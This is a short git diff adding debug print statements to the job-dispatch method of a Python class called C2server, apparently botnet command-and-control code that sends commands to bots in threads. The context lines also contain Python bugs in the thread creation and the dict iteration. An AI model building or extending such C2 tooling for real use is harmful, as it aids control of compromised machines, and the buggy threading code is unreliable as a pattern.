@@ -16,6 +16,8 @@ class C2server():
         self.bots[bot.address[0]] = bot
 
     def start_job(self, command_id):
+        print("Bots: ", end='')
+        print(self.bots)
         response = c2_pb2.StartJobResponse()
         response.response = c2_pb2.StartJobResponse.Response.FAIL
 
@@ -24,11 +26,17 @@ class C2server():
 
         threads = [threading.Thread(self.command_bot, args=(command_id, bot)) for bot_address, bot in self.bots]
 
+        print("Threads created")
+
         for thread in threads:
             thread.start()
 
+        print("Threads started")
+
         for thread in threads:
             thread.join()
+
+        print("Threads finished")
         
         online_bots = 0
         for bot_address, bot in self.bots.items():
